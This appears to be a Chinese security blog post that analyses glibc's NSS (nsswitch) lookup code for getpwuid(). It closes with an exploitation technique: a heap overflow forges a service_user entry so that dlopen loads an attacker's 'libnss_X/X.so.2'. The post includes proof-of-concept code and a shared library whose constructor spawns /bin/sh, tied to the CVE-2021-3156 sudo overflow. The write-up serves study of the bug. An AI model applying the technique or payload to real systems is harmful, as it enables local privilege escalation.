# NSSwitch源码分析与利用

阅读量 **142913**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-28 10:30:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0106abab7d4177b16e.png)

我们以getwuid()为例子探究glibc中是怎么实现NSS机制的, 其他函数都是同一个模板只是参数不同罢了

看本文之前最好先了解下NSS是什么, 有什么用

## nsswitch.conf文件

  * 格式: `Info: method[[action]] [method[[action]]...]`
  * 该nsswitch.conf文件本质上是一个包含 16 种类型的信息以及getXXbyYY() 例程搜索该信息的来源的列表。16 类信息（不一定按此顺序）如下所示。

> aliases
>
> bootparams
>
> ethers
>
> group
>
> hosts
>
> ipnodes
>
> netgroup
>
> netmasks
>
> networks
>
> passwd (includes shadow information)
>
> protocols
>
> publickey
>
> rpc
>
> services
>
> automount
>
> sendmailvars

  * 下表提供了可在上述信息类型的开关文件中列出的源种类的说明。

> files: 保存在/etc目录下的文件, eg: /etc/passwd
>
> nisplus: 一个NIS+表, 例如host表
>
> nis: 一个NIS映射, 例如host 映射
>
> compat: 兼容可以被password和group信息使用以支持老式的/etc/passwd, /etc/shadow和/etc/group文件
>
> dns: 可用于指定从 DNS 获取主机信息
>
> ldap: 可用于指定从 LDAP 目录中获取的条目

  * 以下面这个为例子 
    * nsswitch.conf每一行可以当做是一个数据库. 例如passwd表示: 所有passwd的查询都要遵循这种查找方式
    * 冒号后面的称为数据来源或者服务, 规定了查找方法的规范. 例如: files ldap表示先通过本地文件搜索, 如狗没有的话就通过ldap这一网络协议搜索
    * 对于每个可用的服务SERVICE, 都必须有对应的模块`/lib/libnss_SERVICE.so.1`
    * 并且每个模块中都有同一个数据查询接口, 只是各自的实现不同.
    * 这样查询时就可以很方便的根据nsswitch.conf中指定的服务加载对应的模块, 然后调用模块中的查询函数处理请求

> # /etc/nsswitch.conf  
>  passwd: files ldap

## 函数简介

  * 作用: 获取password文件条目

    
    
    #include <sys/types.h>
    #include <pwd.h>
    
    struct passwd *getpwnam(const char *name);
    
    struct passwd *getpwuid(uid_t uid);
    
    int getpwnam_r(const char *name, struct passwd *pwd,
                char *buf, size_t buflen, struct passwd **result);
    
    int getpwuid_r(uid_t uid, struct passwd *pwd,
                char *buf, size_t buflen, struct passwd **result);
    

  * getpwnam()函数返回一个指针，指向包含在密码数据库中的记录（例如，本地密码文件的断开的字段的结构/ etc / passwd中，NIS和LDAP）相匹配的用户名的名称。
  * 所述getpwuid（）函数返回一个指针，指向包含在该用户ID相匹配的口令的数据库的记录的断开的字段的结构的UID。
  * 所述的passwd结构定义在< pwd.h >如下：

    
    
    struct passwd {
        char *pw_name; /* 用户名 */
        char *pw_passwd; /* 用户密码 */
        uid_t pw_uid; /* 用户 ID */
        gid_t pw_gid; /* 组 ID */
        char *pw_gecos; /* 用户信息 */
        char *pw_dir; /* 主目录 */
        char *pw_shell; /* 外壳程序 */
    };
    

  * 所述getpwnam_r()和getpwuid_r()函数获得与getpwnam()和getpwuid()相同的信息，但存储检索 的passwd在空间结构由指向PWD。passwd结构的成员指向的字符串字段存储在大小为buflen的缓冲区buf中。指向结果（如果成功）或 NULL（如果未找到条目或发生错误）的指针存储在 *result 中。

## getpwuid()

  * 定义在pwd\/getpwuid.c文件中, 与gethostbyname()类似, 都是通过宏定义一些变量, 然后包含一个模板c文件展开为真正的宏定义.

    
    
    #include <pwd.h>
    
    #define LOOKUP_TYPE struct passwd //要查找的数据类型
    #define FUNCTION_NAME getpwuid //函数名
    #define DATABASE_NAME passwd //数据库名
    #define ADD_PARAMS uid_t uid //参数
    #define ADD_VARIABLES uid //变量
    #define BUFLEN NSS_BUFLEN_PASSWD //缓冲区长度
    
    #include "../nss/getXXbyYY.c"
    

  * 这个函数模板简化后如下, 其主要功能就是分配缓冲区, 然后调用可重入版本的函数getpwuid_r()

    
    
    LOOKUP_TYPE* FUNCTION_NAME(ADD_PARAMS)
    {
        static size_t buffer_size;
        static LOOKUP_TYPE resbuf;
        LOOKUP_TYPE* result;
    
        /* Get lock.  */
        __libc_lock_lock(lock);
    
        if (buffer == NULL) //分配缓冲区
        {
            buffer_size = BUFLEN;
            buffer = (char*)malloc(buffer_size);
        }
    
        //调用可重入函数: getpwuid_r(uid, &resbuf, buffer, buffer_size, &result H_ERRNO_VAR)
        while (buffer != NULL && (INTERNAL(REENTRANT_NAME)(ADD_VARIABLES, &resbuf, buffer, buffer_size, &result H_ERRNO_VAR) == ERANGE)
        ) {
            //如果可重入函数表示缓冲区不够大, 就两倍扩张
            char* new_buf;
            buffer_size *= 2;
            new_buf = (char*)realloc(buffer, buffer_size);
            if (new_buf == NULL) {
                free(buffer);
                __set_errno(ENOMEM);
            }
            buffer = new_buf;
        }
    
        if (buffer == NULL)
            result = NULL;
    
        /* Release lock.  */
        __libc_lock_unlock(lock);
    
        return result;
    }
    

## 相关结构体

  * `service_library`用于描述一个打开的模块

    
    
    typedef struct service_library {
        const char* name; //模块名(`files', `dns', `nis', ...)
        void* lib_handle;   //模块的句柄, 也就是dlopen()返回的指针
        struct service_library* next;   //链表指针
    } service_library;
    

  * `known_function`用于缓存一个查询, 保存了函数名到函数指针的映射

    
    
    typedef struct
    {
        const char* fct_name; //函数名
        void* fct_ptr; //函数指针
    } known_function; //已知的函数
    

  * 对于`/etc/nsswitch.con`中描述的每种服务都通过`service_user`描述, 同一数据库中的多个服务通过`service_user->next`指针以单链表的形式组织起来

    
    
    typedef struct service_user {
        struct service_user* next; //链表指针
        lookup_actions actions[5]; /* Action according to result.  */
        service_library* library; //这个服务对应的模块, 也就是动态链接库libnss_SERVICE.so.1
        void* known; //指向一个搜索的树根, 这个搜索树保存了之前搜索过的函数名, 当做缓存用
        char name[0]; //这个服务的名字 (`files', `dns', `nis', ...)
    } service_user;
    

  * 每个数据库, 也就是`/etc/nsswitch.con`中的一行, 都通过`name_database_entry`描述, 多个数据库通过`next`指针以单链表的形式组织

    
    
    typedef struct name_database_entry {
        struct name_database_entry* next; //链表指针, 指向下一个数据库
        service_user* service; //这个数据库所有服务
        char name[0]; //数据库名, 字符串紧接着上一个字段, 同属于一个chunk
    } name_database_entry;
    

  * 一个系统中完整的命名数据库用`name_database`表示, `entry`是一个二维链表头指针, 第一个纬度是各个数据库, 第二个纬度是每个数据库的各种服务(数据来源)

    
    
    typedef struct name_database {
        name_database_entry* entry; //所有数据库组织的单链表
        service_library* library;   //所有的服务模块组成的单链表
    } name_database;
    

## getpwuid_r()

  * 这个函数定义在nss\/getpwuid_r.c中, 也是通过包含模板文件展开得到函数定义的

    
    
    #include <pwd.h>
    
    #define LOOKUP_TYPE    struct passwd
    #define FUNCTION_NAME    getpwuid
    #define DATABASE_NAME    passwd
    #define ADD_PARAMS    uid_t uid
    #define ADD_VARIABLES    uid
    #define BUFLEN        NSS_BUFLEN_PASSWD
    
    #include <nss/getXXbyYY_r.c>
    

  * 简化后的函数模板如下, 主要就是两步: 先从数据库中找到对应处理函数, 再调用这个处理函数

    
    
    int INTERNAL(REENTRANT_NAME)(ADD_PARAMS, LOOKUP_TYPE* resbuf, char* buffer, size_t buflen, LOOKUP_TYPE** result H_ERRNO_PARM EXTRA_PARAMS)
    {
        //每个命名搜索函数都有下面这组静态变量用于缓存上次搜索结果
        static bool startp_initialized;    //是否初始化过
        static service_user* startp;        //本搜索函数对应的服务链表
        static lookup_function start_fct;    //本搜索函数对应的第一个处理函数
    
        service_user* nip;
        int do_merge = 0;
        LOOKUP_TYPE mergegrp;
        char* mergebuf = NULL;
        char* endptr = NULL;
        union {
            lookup_function l;
            void* ptr;
        } fct;  //查找函数
        int no_more, err;
        enum nss_status status = NSS_STATUS_UNAVAIL;
    
        //通过守护进程查询缓存
        ...;
    
    
        if (!startp_initialized) {  //如果还没有初始化
    
            /*
                - 宏展开为:__GI___nss_passwd_lookup2()
                - 先根据/etc/nsswitch.conf找到命名数据库, 再根据数据库名找到这个数据库的所有服务
                - nip中存放了所有可查询数据源 fct指向当前数据源的查询函数
            */
            no_more = DB_LOOKUP_FCT(&nip, REENTRANT_NAME_STRING,REENTRANT2_NAME_STRING, &fct.ptr);
    
            if (no_more) {
                void* tmp_ptr = (service_user*)-1l;
                startp = tmp_ptr;
            } else {
                //写入搜索结果, 这样就不用每次都搜索nsswitch.conf文件了
                void* tmp_ptr = fct.l;
                start_fct = tmp_ptr;
                tmp_ptr = nip;
                startp = tmp_ptr;
            }
    
            atomic_write_barrier();
            startp_initialized = true;
        } else {    //如果已经初始化过就遍历上次记录了服务链表搜索
            fct.l = start_fct;
            nip = startp;
            no_more = nip == (service_user*)-1l;
        }
    
        while (no_more == 0) {
    
            //调用函数查询函数, 宏展开结果会先调用__GI__dl_mcount_wrapper_check(), 然后调用fct里面保存的函数指针, fct.l(...)
            status = DL_CALL_FCT(fct.l, (ADD_VARIABLES, resbuf, buffer, buflen, &errno H_ERRNO_VAR EXTRA_VARIABLES));
    
            //如果查询返回NSS_STATUS_TRYAGAIN 并且errno为ERANGE, 就说明提供的缓冲区太小了, 直接结束, 让调用者重新分配缓冲区
            if (status == NSS_STATUS_TRYAGAIN
                && errno == ERANGE)
                break;
    
            //前后结果合并部分
            ...;
    
            //本数据源中没找到, 切换到下一个数据源, no_more表示还有没有剩下的数据源
            no_more = __nss_next2(&nip, REENTRANT_NAME_STRING, REENTRANT2_NAME_STRING, &fct.ptr, status, 0);
        }
    
        free(mergebuf);
        mergebuf = NULL;
    
    
        //写入返回结果
        *result = status == NSS_STATUS_SUCCESS ? resbuf : NULL;
    
        //设置返回值
        int res;
        if (status == NSS_STATUS_SUCCESS || status == NSS_STATUS_NOTFOUND)
            res = 0;
        /* Don't pass back ERANGE if this is not for a too-small buffer.  */
        else if (errno == ERANGE && status != NSS_STATUS_TRYAGAIN)
            res = EINVAL;
        else
            return errno;
    
        __set_errno(res);
        return res;
    }
    

  * 我们不关注getpwuid()具体是怎么实现的, 我们只是以getpwuid()为例子, 着重于glibc中是怎么通过NSS机制确定处理函数的, 因此下面要研究`DB_LOOKUP_FCT()`的实现
  * `DB_LOOKUP_FCT()`是一个宏, 会展开为`__GI___nss_passwd_lookup2()`, 调用现场如下

![](https://p1.ssl.qhimg.com/t01a2ff7c17ec7f0755.png)

## __nss_passwd_lookup2()

  * 函数定义在nss\/pwd-lookup.c中, 是通过DB_LOOKUP_FCT这个宏展开得到函数定义的

    
    
    #define DATABASE_NAME passwd    //要查询的数据库名
    #ifdef LINK_OBSOLETE_NSL
    # define DEFAULT_CONFIG "compat [NOTFOUND=return] files"
    #else
    # define DEFAULT_CONFIG "files" //默认配置
    #endif
    
    #include "XXX-lookup.c"
    

  * DB_LOOKUP_FCT()定义如下

    
    
    /*
        - 在数据库中搜索fct_name对应的函数, 要查找的数据库名通过宏DATABASE_NAME_STRING确定
        - 参数:
            - ni: 结果参数, 数据库对应所有服务
            - fct_name: 在服务中需要查找的函数名
            - fct2_name: 如果fct_name没找到对应函数的话就会用这个去寻找
            - fctp: 结果参数, 存放找到的函数指针
    */
    int DB_LOOKUP_FCT(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp)
    {
        //根据数据库名找到对应服务
        if (DATABASE_NAME_SYMBOL == NULL && __nss_database_lookup(DATABASE_NAME_STRING, ALTERNATE_NAME_STRING, DEFAULT_CONFIG, &DATABASE_NAME_SYMBOL) < 0)
            return -1;
    
        *ni = DATABASE_NAME_SYMBOL;
    
        //再加载服务对应的模块, 在模块中寻找对应处理函数
        return __nss_lookup(ni, fct_name, fct2_name, fctp);
    }
    

  * 调用`__nss_database_lookup()`的现场如下

![](https://p5.ssl.qhimg.com/t01f2aaa4bae85dfec5.png)

  * 对于`__nss_lookup()`调用现场如下

![](https://p3.ssl.qhimg.com/t01409939891a69302a.png)

## _nss_database_lookup()

  * 函数定义如下:

    
    
    /*
        - 解析/etc/nsswitch.conf文件, 生成一个service_table对象, 里面以链表的形式保存每个数据库及其数据源
        - 参数:
            - database: 要查询的数据库名
            - alternate_name: 数据库别名
            - deconfig: 数据库默认配置
            - ni: 结果参数, 存放这个数据库的所有服务
    */
    int __nss_database_lookup(const char* database, const char* alternate_name, const char* defconfig, service_user** ni)
    {
        /* service_table是临界资源, 多线程下必须上锁  */
        __libc_lock_lock(lock);
    
        if (*ni != NULL) {
            __libc_lock_unlock(lock);
            return 0;
        }
    
        /* service_table保存了当前系统所有命名数据库的信息, 是一个全局变量 */
        if (service_table == NULL)
            service_table = nss_parse_file(_PATH_NSSWITCH_CONF); //解析/etc/nsswitch.conf文件
    
        //解析成功
        if (service_table != NULL) { 
            name_database_entry* entry;
    
            // 遍历数据库条目组成的链表, 找与database匹配的
            for (entry = service_table->entry; entry != NULL; entry = entry->next)
                if (strcmp(database, entry->name) == 0)
                    *ni = entry->service;
    
            //如果database没找到就试一试别名
            if (*ni == NULL && alternate_name != NULL)
                for (entry = service_table->entry; entry != NULL; entry = entry->next)
                    if (strcmp(alternate_name, entry->name) == 0)
                        *ni = entry->service;
        }
    
        //没能找到对应配置文件, 就尝试使用默认配置文件
        if (*ni == NULL) {
            ...;  
        }
    
        __libc_lock_unlock(lock);
    
        return *ni != NULL ? 0 : -1;
    }
    libc_hidden_def(__nss_database_lookup)
    

  * 其中`nss_parse_file()`就是打开`/etc/nsswitch.conf`然后逐行解析并构建对应链表项, 对于passwd数据库, 解析后结果如下. 注意: 这里仅仅只是字符串的解析与复制, 并没有真的打开对应文件.

![](https://p4.ssl.qhimg.com/t01195047a9cf8713bc.png)

## __nss_lookup()

  * `__nss_lookup()`会在服务链表ni中搜索名为fct_name的处理函数, 当fct_name搜索失败时, 搜索fct2_name, 把找到的函数指针写入fctp中

    
    
    int __nss_lookup(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp)
    {
        //先尝试在第一个服务中搜索fct_name
        *fctp = __nss_lookup_function(*ni, fct_name);
    
        //没找到的话就试试fct2_name
        if (*fctp == NULL && fct2_name != NULL)
            *fctp = __nss_lookup_function(*ni, fct2_name);
    
        //如果还是没找到的话 && 在没找到时运行继续查找 && 存在下一个服务 =>就在下一个服务中寻寻找
        while (*fctp == NULL && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_CONTINUE && (*ni)->next != NULL) {
            *ni = (*ni)->next;  //*ni现在指向下一个服务
    
            //根据fct_name搜索
            *fctp = __nss_lookup_function(*ni, fct_name);
    
            //没找到的话就试试fct2_name
            if (*fctp == NULL && fct2_name != NULL)
                *fctp = __nss_lookup_function(*ni, fct2_name);
        }
    
        return *fctp != NULL ? 0 : (*ni)->next == NULL ? 1 : -1;
    }
    libc_hidden_def(__nss_lookup)
    

  * 显然, `__nss_lookup()`依赖于`__nss_lookup_function()`, 我们以第一次调用为例子进行研究, 其调用现场如下

![](https://p3.ssl.qhimg.com/t015cb14ca1142104bb.png)

## __nss_lookup_function()

  * 整理后函数定义如下.每个服务对象`service_user`都有一个搜索数作为缓存, `__nss_lookup_function()`会先尝试从搜索树中查询, 如果找不到再尝试加载模块文件然后在文件中搜索函数符号的地址

    
    
    //根据数据源ni, 返回符号为fct_name的函数的地址
    void* __nss_lookup_function(service_user* ni, const char* fct_name)
    {
        void **found, *result;
    
        /* We now modify global data.  Protect it.  */
        __libc_lock_lock(lock);
    
        /*
            - 先前搜索过的函数都保存在一个搜索树中, 作为缓存
                - 搜索数的树根为ni->known
                - 该搜索树的节点都有一个指向known_function对象的指针
                    - 该树以known_function对象中的函数名fct_name为键对节点进行排序
                    - known_function对象中fct_ptr为节点的值
            - 成功搜索到时__tserach会返回对应节点
            - 搜索失败时会以fct_name为键向搜索数中插入一个节点并返回, 如果要缓存搜索结果的话只需要设置这个节点的know_function指针, 而不用再搜索一次
        */
        found = __tsearch(&fct_name, &ni->known, &known_compare);
    
        if (found == NULL) //溢出
            result = NULL;
        else if (*found != &fct_name) { //成功在缓存中找到, 返回对应的函数指针
            /*
                - 在这个服务的缓存中寻找fct_name对应的函数
                    - 如果树中没找到就会插入一个新节点, 新节点->key = &fct_name
                    - 如果树中找到了就会返回对应节点, 这个节点->key保存的字符串与fct_name一致, 但是地址不同
            */
            result = ((known_function*)*found)->fct_ptr;
        } else { //缓存中没有, 在对应模块中搜索后分配一个known_function对象插入缓存
    
    
            //分配对象
            known_function* known = malloc(sizeof *known);
            if (!known) { //分配失败, 退出前要把之前在搜索树中分配的节点删掉
                __tdelete(&fct_name, &ni->known, &known_compare);
                free(known);
                result = NULL;
            } else {
    
                //为插入的节设置一个新的known_function对象
                *found = known;
                known->fct_name = fct_name;
    
                //加载这个服务对应的模块: /lib/libnss_SERVICE.so.1
                if (nss_load_library(ni) != 0)
                    goto remove_from_tree;
    
                if (ni->library->lib_handle == (void*)-1l) //加载模块失败
                    result = NULL;
                else {
                    //构造函数名: "_nss_" + ni->name + "_" + fct_name + "\0"
                    size_t namlen = (5 + strlen(ni->name) + 1 + strlen(fct_name) + 1);
                    char name[namlen];
                    __stpcpy(__stpcpy(__stpcpy(__stpcpy(name, "_nss_"), ni->name), "_"), fct_name);
    
                    //在模块中寻找对应函数
                    result = __libc_dlsym(ni->library->lib_handle, name);
                }
    
                //函数已经找到, 写入known_function对象
                known->fct_ptr = result;
            }
        }
    
        /* Remove the lock.  */
        __libc_lock_unlock(lock);
    
        //返回函数地址
        return result;
    }
    libc_hidden_def(__nss_lookup_function)
    

  * 我们关注下模块具体是怎么加载的, `nss_load_library()`的调用现场如下

![](https://p0.ssl.qhimg.com/t01a0caa633818e5e07.png)

## nss_load_library()

  * 函数定义如下.

    
    
    //加载服务ni对应的模块
    static int nss_load_library(service_user* ni)
    {
        //如果这个服务是第一次用, 那么先创建一个service_library对象, 这是进行字符串的复制, 不会打开文件
        if (ni->library == NULL) {
            static name_database default_table;
            ni->library = nss_new_service(service_table ?: &default_table, ni->name);
            if (ni->library == NULL)
                return -1;
        }
    
        //句柄为NULL表示这个服务并没有打开模块, 因此要加载服务对应模块
        if (ni->library->lib_handle == NULL) {
    
            //先构造服务对应的依赖库的名称:  "libcnss_" + 服务名 + ".so" + 库版本号 + "\0". 这里会打开libnss_compat.so.2
            size_t shlen = (7 + strlen(ni->name) + 3 + strlen(__nss_shlib_revision) + 1);
            int saved_errno = errno;
            char shlib_name[shlen];
            __stpcpy(__stpcpy(__stpcpy(__stpcpy(shlib_name, "libnss_"), ni->name), ".so"), __nss_shlib_revision);
    
            //然后调用dl_open()打开这个函数
            ni->library->lib_handle = __libc_dlopen(shlib_name);
            if (ni->library->lib_handle == NULL) {
                /* Failed to load the library.  */
                ni->library->lib_handle = (void*)-1l;
                __set_errno(saved_errno);
            }
        }
    
        return 0;
    }
    

  * 这里需要注意一点: 当dlopen()加载一个so文件时, 如果这个so文件设置了构造函数, 那么dlopen()会自动执行此函数

## __nss_next2()

  * 函数定义如下. 这个函数会遍历服务链表, 对于每一个服务调用`__nss_lookup_function()`进行搜索

    
    
        /*
        - 切换到下一个数据源, 寻找符号为fct_name的函数, 把函数地址写入fctp中, 如果fct_name没找到的话就试试fct2_name
        - 返回值:
            - -1:没找到
            - 0: 成功切换到下一个函数
            - 1: 遍历结束
    */  
    int __nss_next2(service_user** ni, const char* fct_name, const char* fct2_name, void** fctp, int status, int all_values)
    {
        if (all_values) {
            if (nss_next_action(*ni, NSS_STATUS_TRYAGAIN) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_NOTFOUND) == NSS_ACTION_RETURN
                && nss_next_action(*ni, NSS_STATUS_SUCCESS) == NSS_ACTION_RETURN)
                return 1;
        } else {
            /* This is really only for debugging.  */
            if (__builtin_expect(NSS_STATUS_TRYAGAIN > status
                        || status > NSS_STATUS_RETURN,
                    0))
                __libc_fatal("illegal status in __nss_next");
    
            if (nss_next_action(*ni, status) == NSS_ACTION_RETURN)
                return 1;
        }
    
        //服务链表的next为NULL, 表示链表结束
        if ((*ni)->next == NULL)
            return -1;
    
        do {
            *ni = (*ni)->next; //下一个链表节点
    
            *fctp = __nss_lookup_function(*ni, fct_name); //加载这个服务对应的模块, 然后在模块中寻找fct_name对应的函数地址
    
            //如果fct_name没找到的话试试fct2_name
            if (*fctp == NULL && fct2_name != NULL)
                *fctp = __nss_lookup_function(*ni, fct2_name);
    
            //循环条件: 还没找到函数 && 在没找到时运行继续寻找 && 还有下一个服务
        } while (*fctp == NULL && nss_next_action(*ni, NSS_STATUS_UNAVAIL) == NSS_ACTION_CONTINUE && (*ni)->next != NULL);
    
        return *fctp != NULL ? 0 : -1;
    }
    libc_hidden_def(__nss_next2)
    

## 攻击面

  * 根据上述分析, 我们着重考虑`nss_load_library()`, 这个函数负责加载服务对应的库, 如果`ni->library==NULL`或者`ni->library->lib_handle == NULL`, 该函数会根据`ni->name`构造出so库名, 然后调用dlopen()打开这个库
  * 假如我们只有一次堆溢出的机会, 不可泄露地址, 我们可以溢出服务链表中的`service_user`对象:令`ni->library为NULL`, 令`ni->name="XXX"`, 这样就可以在下一次搜索服务链表打开`libnss_XXX.so.2`文件, 并且会执行`libnss_XXX.so.2`的构造函数.
  * 例子 
    * 第一次调用`getpwuid()`时会解析nsswitch.conf文件把配置写入到service_table中, 在startp中写入passwd数据库对应的服务链表, 然后再进行函数搜索工作
    * 假如现在溢出`service_table`中`group`数据库的一个服务, 也就是`service_user`对象: 令`ni->library为NULL`, 令`ni->name="X/X"`, 这样就在`group`数据库中伪造了一个模块
    * 第二次调用`getgrgid()`时仍需要nsswitch.conf文件, 但是由于上次调用`getpwuid()`已经设置过service_table了, 因此会直接从这个链表中获取`group`数据库对应的服务模块
    * 进入`__nss_lookup_function()`寻找函数时会先调用`nss_load_library()`加载模块, 由于`ni->library`为NULL, 因此会调用dlopen()加载我们的库
    * 如果我们覆盖name为X的话, 那么构造出来的文件名为`libnss_X.so.2`, dlopen()会默认到`/usr/lib`中寻找, 显然我们不能在这个目录中写入文件, 如果覆盖name为`X/X`的话, 得到的文件名为`libnss_X/X.so.2`, 会把前面一部分解析成目录, 会现在当前目录下寻找`libnss_X`目录, 再找`X.so.2`文件, 这个就很好写入了
  * 例子:

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <dlfcn.h>
    #include <sys/types.h>
    #include <pwd.h>
    
    
    typedef struct service_user {
        struct service_user* next; //链表指针
        int actions[5]; /* Action according to result.  */
        void* library; //这个服务对应的模块, 也就是动态链接库libnss_SERVICE.so.1
        void* known; //指向一个搜索的树根, 这个搜索树保存了之前搜索过的函数名, 当做缓存用
        char name[0]; //这个服务的名字 (`files', `dns', `nis', ...)
    } service_user;
    
    int main(void)
    {
        char* p = malloc(0x10); //0x555555756260
    
        getpwuid(1000); //initial
    
        //heao overflow to forge service_user
        service_user* ni = p+0x17d0;  //systemd
    
        ni->next = 0x0;
        ni->library = NULL;
        ni->known = NULL;
        strcpy(ni->name, "X/X");
    
    
        getgrgid(1000); //trigger
    }
    

  * 覆盖之后的`service_table`

![](https://p5.ssl.qhimg.com/t0166d866f4f6786b2f.png)

  * 共享库

    
    
    /*
        mkdir libnss_X
        gcc -fPIC -shared -o ./libnss_X/X.so.2
    */
    #include <stdio.h>
    #include <stdlib.h>
    
    static void __attribute__((constructor)) MyInit(void);
    
    static void MyInit(void)
    {
        write(1, "MyInit\n", 7);
        execve("/bin/sh\x00", 0, 0);
    }
    

<https://xiaoxin.zone/2021/03/21/cve-2021-3156-sudo-ti-quan-lou-dong-dui-yi-chu-diao-shi-fen-xi/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **一只狗** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254263](/post/id/254263)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [二进制安全](/tag/二进制安全)

 **+1** __1赞

 __收藏

![](https://p2.ssl.qhimg.com/t0129dce3bc1ba3282b.jpg) 一只狗

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

